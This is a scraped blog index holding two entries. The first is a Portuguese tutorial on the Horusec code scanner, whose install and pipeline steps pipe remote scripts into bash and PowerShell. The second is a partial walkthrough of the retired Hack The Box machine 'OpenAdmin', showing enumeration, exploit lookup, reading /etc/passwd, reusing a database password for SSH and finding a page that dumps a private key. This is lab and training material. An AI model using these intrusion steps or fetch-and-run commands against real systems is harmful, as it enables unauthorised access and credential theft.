http://www.catho.com.br/carreira-sucesso/dicas-emprego/dicas-para-ter-uma-navegacao-segura-na-web`}).add({id:104,tag:"en",href:"/tags/open-source/",title:"Open Source",description:"",content:""}).add({id:105,tag:"en",href:"/blog/opensource_sast_com_horusec/",title:"Open Source SAST com Horusec",description:"Mais um manual e casos de uso atualizados dessa ótima solução de scans de vulnerabilidades em código fonte.",content:`Sumário &nbsp; Sumário Introdução Principais Funcionalidades Benefícios do Uso do Horusec Casos de uso Horusec VsCode IDE Plugin Instalação dos binários (Windows, Linux e Mac) Windows Linux e Mac Horusec CLI sem Docker (Binário) Horusec CLI com Docker (Binário) Horusec Docker Reports customizados Horusec em pipeline Github Actions Enfim….o mesmo blá blá blá do cara de segurança…. 🥱 Referências Introdução &nbsp; Horusec é uma ferramenta de Análise Estática de Segurança de Aplicações (SAST) que auxilia no processo de desenvolvimento seguro de software. Projeto todo conduzido e mantido pelo pessoal da ZupIT.
Desenvolvido com o objetivo de identificar vulnerabilidades em código-fonte de forma automatizada, o Horusec se destaca por sua eficiência e integração com diversas tecnologias.
Além disso, a documentação oficial do Horusec é abrangente e detalhada, fornecendo guias passo a passo para instalação, configuração e uso da ferramenta. Há também tutoriais e exemplos práticos que ajudam os usuários a entender melhor como tirar proveito das funcionalidades oferecidas.
Visão Geral | Horusec
Arquitetura completa do Horusec. Principais Funcionalidades &nbsp; Análise de Código: O Horusec realiza uma análise detalhada do código-fonte, identificando possíveis vulnerabilidades que podem comprometer a segurança da aplicação. Integração Contínua: A ferramenta pode ser facilmente integrada em pipelines de integração contínua (CI/CD), permitindo que as análises de segurança sejam executadas automaticamente a cada nova atualização de código. Relatórios Detalhados: Após a análise, o Horusec gera relatórios detalhados com todas as vulnerabilidades encontradas, nos formatos Sarif, Json, Texto ou para integração com Sonarqube, categorizando-as por nível de severidade e sugerindo possíveis correções. Suporte a Múltiplas Linguagens: A ferramenta suporta uma ampla variedade de linguagens de programação e frameworks, tornando-a versátil para diferentes tipos de projetos. Plataforma Web: As aplicações web do Horusec são uma extensão das funcionalidades da CLI para gerenciar as vulnerabilidades encontradas e, assim, realizar a classificação delas. Benefícios do Uso do Horusec &nbsp; Horusec tem sido amplamente adotado por equipes de desenvolvimento que buscam incorporar práticas de segurança em seu fluxo de trabalho. Aqui estão alguns exemplos de como a ferramenta pode ser utilizada:
Durante o Desenvolvimento: Desenvolvedores podem executar análises de segurança a qualquer momento do ciclo de desenvolvimento, identificando vulnerabilidades antes de enviar o código para o repositório compartilhado. Em Pipelines de CI/CD: Integrar Horusec em pipelines de CI/CD garante que cada nova versão do software seja analisada quanto a vulnerabilidades, evitando que código inseguro chegue à produção. Auditorias de Segurança: Equipes de segurança podem usar Horusec para realizar auditorias periódicas no código-fonte, identificando e corrigindo vulnerabilidades que possam ter sido introduzidas ao longo do tempo. Casos de uso &nbsp; Abordaremos alguns casos de uso mais comuns, lembrando que o objetivo destes tutoriais é para o uso local de desenvolvedores e em pipelines simples em Github Actions. Cenários mais complexos serão trazido mais adiante.
Nos laboratórios abaixo, utilizaremos os seguintes recursos:
Sistemas operacionais Windows, Linux e MacOS; Docker Desktop para uso de containers; Microsoft VsCode para visualização de códigos fontes; Pyhton 3 para scripts auxiliares; Código fonte de alguma aplicações para análise. Utilizaremos as seguintes: VamPI (Python) | erev0s VulnerableLightApp (.NET) | Michaël Vacarella Horusec VsCode IDE Plugin &nbsp; O plugin do Horusec pode ser encontrado na loja de extensões do VsCode. Apesar de há muito sem atualizações, tudo ainda funciona muito bem.
Procure pelo Horusec no Marketplace de plugins do VsCode.
Horusec IDE Plugin Uma vez instalado, abra a pasta do seu projeto e execute o scan.
Análise no projeto em Python VamPI. Análise no projeto em .NET VulnerableLightApp. Instalação dos binários (Windows, Linux e Mac) &nbsp; &nbsp; Para o uso com Docker, para as versões mais atuais do Docker Desktop é necessária a utilização da versão 2.9.0-beta.3. Windows &nbsp; Realize o download do binário do acessando o repositório no Github ou baixe via linha de comando.
Nos exemplos abaixo o teste é realizado em ambiente Windows, o que não muda nada para as demais arquiteturas.
#x64 curl &#34;https://github.com/ZupIT/horusec/releases/download/v2.9.0-beta.3/horusec_windows_amd64.exe&#34; -o &#34;./horusec.exe&#34; #arm64 curl &#34;https://github.com/ZupIT/horusec/releases/download/v2.9.0-beta.3/horusec_windows_arm64.exe&#34; -o &#34;./horusec.exe&#34; Linux e Mac &nbsp; #Linux x64 wget https://github.com/ZupIT/horusec/releases/download/v2.9.0-beta.3/horusec_mac_amd64 -O horusec ; \\ chmod +x horusec #Mac M1/M2 wget https://github.com/ZupIT/horusec/releases/download/v2.9.0-beta.3/horusec_mac_arm64 -O -O horusec ; \\ chmod +x horusecSe preferir, mova os arquivos em seguida para a pasta de binários:
sudo mv horusec /usr/local/bin/ Horusec CLI sem Docker (Binário) &nbsp; O Horusec foi muitas possibilidades de configuração, caso queira gerar um arquivo com todas as possibilidades de condifuração, execute com a opção generate.
.\\horusec.exe generateO arquivo horusec-config.json será gerado, como o abaixo.
horusec-config.json Horusec CLI com Docker (Binário) &nbsp; Nada muda muito do exemplo acima (sem Docker), com excessão da permanência padrão da opção de uso de todos os recursos dependentes do Docker.
horusec start -G -o=&#34;sarif&#34; -O=&#34;horusec_report.sarif&#34; -p=&#34;vulnerable_apps/VulnerableLightApp&#34; Comparação entre o uso sem e com o Docker.
Utilizando as outras engines solicitadas via Docker, foram encontradas 13 vulnerabilidades, enquanto com as engines padrões apenas 3. As engines default do Horusec são as seguintes:
horusec-csharp horusec-kotlin horusec-java horusec-kubernetes horusec-leaks horusec-javascript horusec-dart horusec-nginx Na página de documentação deles é possível visualizar a lista das ferramentas auxiliares, linguagens cobertas e suas versões.
Horusec Docker &nbsp; Para começar, entre no diretório do projeto a ser analisado e execute o seguinte comando:
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\ -v $(pwd):/src/horusec \\ horuszup/horusec-cli:v2.9.0-beta.3 horusec start -p /src/horusec -P $(pwd) Você pode encorpar seu script com diversas variáveis, isso será muito útil para a as integrações nas pipelines. Copie e cole o script abaixo em seu terminal caso esteja em ambiente Linux ou Mac:
#CRIA PASTA DE RELATÓRIO mkdir reports; \\ #CONFIGURAÇÃO DE PARÂMETROS DO HORUSEC #image=&#34;0xtiago/horusec-cli&#34;; \\ image=&#34;horuszup/horusec-cli:v2.9.0-beta.3&#34;; \\ severity_exception=&#34;LOW,UNKNOWN,INFO&#34;; \\ report_type=&#34;json&#34;; \\ report_directory=&#34;reports&#34; ;\\ report_file=&#34;horusec_report.json&#34; ;\\ ignore=&#34;**/tmp/**, **/.vscode/**,\\ **/.venv/**, \\ **/.env/**, \\ **/tests/**, \\ **/test/**, \\ **/test/, \\ **/*.Tests/**, \\ **/*.Test/**, \\ **/test_*, \\ **/appsettings.*.json, \\ **/bin/Debug/*/appsettings.*.json, \\ **/*.yml, \\ **/bin/Debug/*/appsettings.json, \\ **/*.sarif&#34; ;\\ # EXECUTA CONTAINER DO HORUSEC REMOVENDO-O AO FIM DA EXECUÇÃO docker pull $image ;\\ docker run --rm \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v $(pwd):/src/horusec $image horusec start \\ -p /src/horusec -P $(pwd) \\ -o=&#34;$report_type&#34; \\ -O=&#34;/src/horusec/$report_directory/$report_file&#34; \\ -s=$severity_exception \\ --ignore=$ignore \\ --information-severity=true Em Mac ou Linux, pode executar diretamente o seguinte script em seu terminal:
bash &lt;(curl -s https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_linux.sh)Se estiver em ambiente Windows, basta copiar e copiar o seguinte script no powershell:
# CONFIGURAÇÃO DE PARÂMETROS DO HORUSEC $image = &#34;horuszup/horusec-cli:v2.9.0-beta.3&#34; $severity_exception = &#34;LOW,UNKNOWN,INFO&#34; $report_type = &#34;json&#34; $report_directory = &#34;reports&#34; $report_path = &#34;reports/horusec_report.json&#34; $ignore = @( &#34;**/tmp/**&#34;, &#34;**/.vscode/**&#34;, &#34;**/.venv/**&#34;, &#34;**/.env/**&#34;, &#34;**/tests/**&#34;, &#34;**/test/**&#34;, &#34;**/test/&#34;, &#34;**/*.Tests/**&#34;, &#34;**/*.Test/**&#34;, &#34;**/test_*&#34;, &#34;**/appsettings.*.json&#34;, &#34;**/bin/Debug/*/appsettings.*.json&#34;, &#34;**/*.yml&#34;, &#34;**/bin/Debug/*/appsettings.json&#34;, &#34;**/*.sarif&#34; ) -join &#39;,&#39; # CRIA PASTA DE RELATÓRIO if (-Not (Test-Path -Path reports))  New-Item -ItemType Directory -Path $report_directory  # EXECUTA CONTAINER DO HORUSEC REMOVENDO-O AO FIM DA EXECUÇÃO docker pull $image docker run --rm \` -v /var/run/docker.sock:/var/run/docker.sock \` -v $PWD:/src/horusec $image horusec start \` -p /src/horusec -P $PWD \` -o=&#34;$report_type&#34; \` -O=&#34;$report_directory/$report_path&#34; \` -s=&#34;$severity_exception&#34; \` --ignore=&#34;$ignore&#34; \` --information-severity=$trueOu, pode executar diretamente o seguinte script em seu terminal algumas das alternativas abaixo:
Invoke-WebRequest -Uri &#34;https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_docker_windows.ps1&#34; -OutFile &#34;horusec_docker_windows.ps1&#34;; .\\horusec_docker_windows.ps1; Remove-Item &#34;horusec_docker_windows.ps1&#34;Ou&hellip;
iex ((New-Object System.Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_docker_windows.ps1&#39;)) &nbsp; O Docker Hub atualmente possui políticas de limitação downloads (pulls) de imagens de container. Caso implemente integrações nas pipelines, é possível que você seja afetado devido às regras. Talvez seja necessária a assinatura do DockerHub ou criação dos próprios containers, uso de registries internos (Ex. AWS) e customização do script do Horusec para integrar estas novas imagens. Valores do DockerHub no mês de 07/2024.
https://res.cloudinary.com/dtr6hzxnx/image/upload/v1721863692/blog/0783dc8d-b710-4031-b3aa-3843e617d520.png
Reports customizados &nbsp; O Horusec por CLI possui tipos de relatório voltados para visualização em cli (text) ou para que sejam importados para outra soluções (json, sarif, sonarqube), porém não há opções visuais para para uso na pipeline como artefato ou localmente como nos exemplos anteriores. Para ajudar nesta necessidade, podemos adotar o uso de scrips customizados para tratar estas informações e converter para um markdown.
Dada a seguinte estrutura do json vigente na versão v2.9.0-beta.3, utilizaremos o Python 3 e a biblioteca grip para ajudar na visualização do Markdown.
 &#34;version&#34;: &#34;v2.9.0-beta.3&#34;, &#34;id&#34;: &#34;af2cf885-da12-4eaf-b277-bacb4b514efa&#34;, &#34;repositoryID&#34;: &#34;00000000-0000-0000-0000-000000000000&#34;, &#34;repositoryName&#34;: &#34;&#34;, &#34;workspaceID&#34;: &#34;00000000-0000-0000-0000-000000000000&#34;, &#34;workspaceName&#34;: &#34;&#34;, &#34;status&#34;: &#34;success&#34;, &#34;errors&#34;: &#34;&#34;, &#34;createdAt&#34;: &#34;2024-07-22T19:07:43.491963638Z&#34;, &#34;finishedAt&#34;: &#34;2024-07-22T19:07:50.525841211Z&#34;, &#34;analysisVulnerabilities&#34;: [  &#34;vulnerabilityID&#34;: &#34;00000000-0000-0000-0000-000000000000&#34;, &#34;analysisID&#34;: &#34;af2cf885-da12-4eaf-b277-bacb4b514efa&#34;, &#34;createdAt&#34;: &#34;2024-07-22T19:07:50.525846794Z&#34;, &#34;vulnerabilities&#34;:  &#34;vulnerabilityID&#34;: &#34;0e9ac1d1-d971-40b6-93ab-f049ac5c5c7d&#34;, &#34;line&#34;: &#34;12&#34;, &#34;column&#34;: &#34;21&#34;, &#34;confidence&#34;: &#34;MEDIUM&#34;, &#34;file&#34;: &#34;config.py&#34;, &#34;code&#34;: &#34;vuln_app.app.config[&#39;SECRET_KEY&#39;] = &#39;random&#39;&#34;, &#34;details&#34;: &#34;DESCRIÇÃO DA VULNERABILIDADE&#34;, &#34;securityTool&#34;: &#34;HorusecEngine&#34;, &#34;language&#34;: &#34;Leaks&#34;, &#34;severity&#34;: &#34;CRITICAL&#34;, &#34;type&#34;: &#34;Vulnerability&#34;, &#34;commitAuthor&#34;: &#34;-&#34;, &#34;commitEmail&#34;: &#34;-&#34;, &#34;commitHash&#34;: &#34;-&#34;, &#34;commitMessage&#34;: &#34;-&#34;, &#34;commitDate&#34;: &#34;-&#34;, &#34;rule_id&#34;: &#34;HS-LEAKS-25&#34;, &#34;vulnHash&#34;: &#34;9e117a0e8c29e2cfa26ebae8f4c2e40c97dbc0d408d0bc2b77809a127c4f7380&#34;, &#34;deprecatedHashes&#34;: [ &#34;6ed75629a18be6d8b4b1303a4c6d3bc7adec12975e75351573d476206d6ccecb&#34;, &#34;15b8662ec5d7866e1a8e32608dbfdd34c9d2f8d3f200a4572879fdb71b0f8679&#34; ], &#34;securityToolVersion&#34;: &#34;&#34;, &#34;securityToolInfoUri&#34;: &#34;&#34;  ,  &#34;vulnerabilityID&#34;: &#34;00000000-0000-0000-0000-000000000000&#34;, &#34;analysisID&#34;: &#34;af2cf885-da12-4eaf-b277-bacb4b514efa&#34;, &#34;createdAt&#34;: &#34;2024-07-22T19:07:50.525851877Z&#34;, &#34;vulnerabilities&#34;:  &#34;vulnerabilityID&#34;: &#34;29dca9c1-2af3-4909-8e6f-51bddfce806d&#34;, &#34;line&#34;: &#34;48&#34;, &#34;column&#34;: &#34;70&#34;, &#34;confidence&#34;: &#34;MEDIUM&#34;, &#34;file&#34;: &#34;models/user_model.py&#34;, &#34;code&#34;: &#34;payload = jwt.decode(auth_token, vuln_app.app.config.get(&#39;SECRET_KEY&#39;), algorithms=[\\&#34;HS256\\&#34;])&#34;, &#34;details&#34;: &#34;DESCRIÇÃO DA VULNERABILIDADE&#34;, &#34;securityTool&#34;: &#34;HorusecEngine&#34;, &#34;language&#34;: &#34;Leaks&#34;, &#34;severity&#34;: &#34;CRITICAL&#34;, &#34;type&#34;: &#34;Vulnerability&#34;, &#34;commitAuthor&#34;: &#34;-&#34;, &#34;commitEmail&#34;: &#34;-&#34;, &#34;commitHash&#34;: &#34;-&#34;, &#34;commitMessage&#34;: &#34;-&#34;, &#34;commitDate&#34;: &#34;-&#34;, &#34;rule_id&#34;: &#34;HS-LEAKS-25&#34;, &#34;vulnHash&#34;: &#34;8f2fccfa6177367da180c79a2c6c9f030a338a8c464e08bda9483bca266b9276&#34;, &#34;deprecatedHashes&#34;: [ &#34;ebc728f3e0cd90b6495ffc5b0adaa1d3f669b33a8d9e10f02830ff15f61918c2&#34;, &#34;6073e224d1a70921ed541833dfc3a51a1123ba3e7df368054c8f027f23614eae&#34; ], &#34;securityToolVersion&#34;: &#34;&#34;, &#34;securityToolInfoUri&#34;: &#34;&#34;   ] Considerando que o horusec_report.json está no mesmo diretório de execução, você pode baixar o script horusec_json2md.py e executar passando os argumentos da seguinte forma:
#Baixe o script wget https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_json2md/horusec_json2md.py ; pip install colorama #Execute passando os argumentos com o local do json e o destino do markdown ./horusec_json2md.py horusec_report.json horusec_report.mdOpcionalmente, instale o colorama (pip install colorama) para exibir cores do output quando houver ou não vulnerabilidades.
Após a execução, você pode utilizar a biblioteca grip ou qualquer outra aplicação para visualizar o markdown, como o Typora ou o VsCode.
#Instale o grip pip install grip # Abra o markdown grip horusec_report.md # ou caso o seu ambiente nao encontro o grip apos a instação\\ python -m grip horusec_report.md Acesse a URL gerada pelo grip através do Flask:
http://localhost:6419/
Visualizando no VsCode:
Você pode visualizar um exemplo do markdown clicando aqui.
Para facilitar com one-liners, abaixo exemplos em Linux/Mac e Windows que utilizaremos mais tarde na documentação do report na pipeline, usando a mesma premissa que o arquivo json está no mesmo diretório de execução e o arquivo markdown será gerado no mesmo local:
#Linux ou Mac wget -qO- https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_json2md/horusec_json2md.py | python3 - horusec_report.json horusec_report.md#Windows Invoke-WebRequest -Uri &#34;https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_json2md/horusec_json2md.py&#34; -OutFile &#34;horusec_json2md.py&#34; ; python horusec_json2md.py horusec_report.json horusec_report.md Horusec em pipeline Github Actions &nbsp; Assim como qualquer outra solução por linha de comando, podemos utilizar o Horusec nas pipelines de desenvolvimento.
No marketplace do Github há uma solução pronta, mas como quero customizar um pouco o processo, você pode utilizar como exemplo o script abaixo, onde o scan é realizado, é gerado um relatório em markdown do arquivo json, o artefato é disponibilizado como artefato e é adicionado ao sumário para analise imediata do desenvolvedor.
name: Run Horusec (SAST), Generate Script and Save Artifact on: push: branches: - main pull_request: branches: - main jobs: run-scripts: runs-on: ubuntu-latest steps: - name: Checkout repository uses: actions/checkout@v3 - name: SAST - Horusec Run 🐞 run: | curl -sL https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_docker_linux.sh| bash - name: SAST - Horusec Report Generation 📊 run: | cd reports curl -sL https://raw.githubusercontent.com/0xtiago/opensource-devsecops/main/tools/horusec/horusec_json2md/horusec_json2md.py -o horusec_json2md.py python3 horusec_json2md.py horusec_report.json horusec_report.md - name: SAST - Horusec Upload Report Artifact 💾 uses: actions/upload-artifact@v3 with: name: SAST - Horusec Scan path: reports/horusec_report.md - name: SAST - Horusec Results In Summary 💁🏽 run: cat reports/horusec_report.md &gt;&gt; $GITHUB_STEP_SUMMARYAdicione o arquivo em .github/workflows/nome_do_workflow.yml na raiz do seu projeto mantido no Github. Aqui chamo meu arquivo de sast-horusec.yml
Abaixo um resumo do processo na pipeline.
Enfim….o mesmo blá blá blá do cara de segurança…. 🥱 &nbsp; A implementação de testes de segurança estática (SAST) é essencial para qualquer desenvolvedor comprometido com a criação de software seguro e confiável. Esses testes permitem a identificação precoce de vulnerabilidades no código-fonte, antes mesmo da execução do programa, garantindo a mitigação de riscos e a conformidade com normas de segurança. Além disso, ao integrar SAST no ciclo de desenvolvimento, os desenvolvedores podem melhorar continuamente suas práticas de codificação, reduzindo custos e evitando potenciais falhas de segurança que poderiam comprometer a integridade dos sistemas. Portanto, a adoção de SAST é um passo crucial para garantir a segurança e a robustez das aplicações modernas.
Outros artigos serão publicado por este que vos fala, complementando todo o ciclo de testes de segurança no deploy de uma aplicação.
Até mais.
👾
Referências &nbsp; https://www.zup.com.br/ https://horusec.io/site/ https://github.com/ZupIT/horusec https://github.com/Aif4thah/VulnerableLightApp https://github.com/erev0s/VAmPI https://www.docker.com/pricing/ https://github.com/marketplace/actions/horusec`}).add({id:106,tag:"en",href:"/blog/openadmin-htb/",title:"OpenAdmin - Hack The Box (Retired)",description:"OpenAdmin - Hack The Box retired machine walkthrough.",content:`🔎Enumeration &nbsp; # nmap -sV -A -O 10.10.10.171Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 23:16 -03Nmap scan report for 10.10.10.171Host is up (0.21s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=4/23%OT=22%CT=1%CU=30878%PV=Y%DS=2%DC=T%G=Y%TM=5EA24C0OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPSOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECNOS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(ROS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%FOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CDOS:=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 23/tcp)HOP RTT ADDRESS1 217.21 ms 10.10.14.12 217.88 ms 10.10.10.171OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 35.71 seconds enter code hereNothing found when enum port 80 with Nikto. =(
# nikto -h 10.10.10.171- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.10.171+ Target Hostname: 10.10.10.171+ Target Port: 80+ Start Time: 2020-04-23 23:21:07 (GMT-3)---------------------------------------------------------------------------+ Server: Apache/2.4.29 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent+ The X-Content-Type-Options header is not set. This could allow the user agent to re+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 597dbd5dcea8b, mtime: gzip+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Allowed HTTP Methods: GET, POST, OPTIONS, HEADBruteforce directories on port 80 with ffuf.
./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.171/FUZZ/'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v0.12________________________________________________:: Method : GET:: URL : http://10.10.10.171/FUZZ:: Follow redirects : false:: Calibration : false:: Timeout : 10:: Threads : 40:: Matcher : Response status: 200,204,301,302,307,401,403________________________________________________.htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10].htaccess [Status: 403, Size: 277, Words: 20, Lines: 10]artwork [Status: 301, Size: 314, Words: 20, Lines: 10]music [Status: 301, Size: 312, Words: 20, Lines: 10]server-status [Status: 403, Size: 277, Words: 20, Lines: 10]sierra [Status: 301, Size: 313, Words: 20, Lines: 10]:: Progress: [20469/20469] :: 173 req/sec :: Duration: [0:01:58] :: Errors: 0 ::Looking further we got the following apps.
We found an OpenNetAdmin service, version 18.1.1.
root@kali:~/Documents/htb# searchsploit opennetadmin------------------------------------------ ---------------------------------Exploit Title | Path------------------------------------------ ---------------------------------OpenNetAdmin 13.03.01 - Remote Code Execu | php/webapps/26682.txtOpenNetAdmin 18.1.1 - Command Injection E | php/webapps/47772.rbOpenNetAdmin 18.1.1 - Remote Code Executi | php/webapps/47691.sh------------------------------------------ ---------------------------------🚪🚶Foothold &nbsp; OpenNetAdmin has a critical vulnerability, which allow us to execute commands remotely.
Copy the exploit to your current directory:
cp /usr/share/exploitdb/exploits/php/webapps/47691.sh .Let&rsquo;s keep enumerating&hellip;🔎
$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinjimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bashmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/falsejoanna:x:1001:1001:,,,:/home/joanna:/bin/bashWe found something interesting in the app loca/config directory:
$ ls -lha local/configtotal 16Kdrwxrwxr-x 2 www-data www-data 4.0K Nov 21 16:51 .drwxrwxr-x 5 www-data www-data 4.0K Jan 3 2018 ..-rw-r--r-- 1 www-data www-data 426 Nov 21 16:51 database_settings.inc.php-rw-rw-r-- 1 www-data www-data 1.2K Jan 3 2018 motd.txt.example-rw-r--r-- 1 www-data www-data 0 Nov 21 16:28 run_installer$ cat local/config/database_settings.inc.php
&lt;?php $ona_contexts=array ( &#39;DEFAULT&#39; =&gt; array ( &#39;databases&#39; =&gt; array ( 0 =&gt; array ( &#39;db_type&#39; =&gt; &#39;mysqli&#39;, &#39;db_host&#39; =&gt; &#39;localhost&#39;, &#39;db_login&#39; =&gt; &#39;ona_sys&#39;, &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;, &#39;db_database&#39; =&gt; &#39;ona_default&#39;, &#39;db_debug&#39; =&gt; false, ), ), &#39;description&#39; =&gt; &#39;Default data context&#39;, &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;, ), );Now we have some important infos:
Usernames jimmy joanna MySQL credentials Probable usefull rsa keys What about combine some information? 🤔
Let&rsquo;s try connect on ssh!
Username: jimmy Password: n1nj4W4rri0R!
But we couldn&rsquo;t find any user flag here.
$ find / -iname &quot;user.txt&quot; 2&gt; /dev/nullLet&rsquo;s try to find something tasty to jimmy user:
$ find / -type f -user jimmy 2&gt; /dev/null.../var/www/internal/main.php/var/www/internal/logout.php/var/www/internal/index.php/home/jimmy/.local/share/nano/search_history/home/jimmy/.bashrc/home/jimmy/.cache/motd.legal-displayed/home/jimmy/.profile/home/jimmy/.bash_logoutLooking all the files, there is something nice in main.php:
$ cat /var/www/internal/main.php&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;]))  header(&#34;Location: /index.php&#34;); ; # Open Admin Trusted # OpenAdmin $output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;); echo &#34;&lt;pre&gt;$output&lt;/pre&gt;&#34;; ?&gt; &lt;html&gt; &lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt; Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session &lt;/html&gt; Maybe there is an application running and showing joanna rsa key
jimmy@openadmin:~$ netstat -putan (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 360 10.10.10.171:22 10.10.14.34:35318 ESTABLISHED - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - jimmy@openadmin:~$ Gotcha!
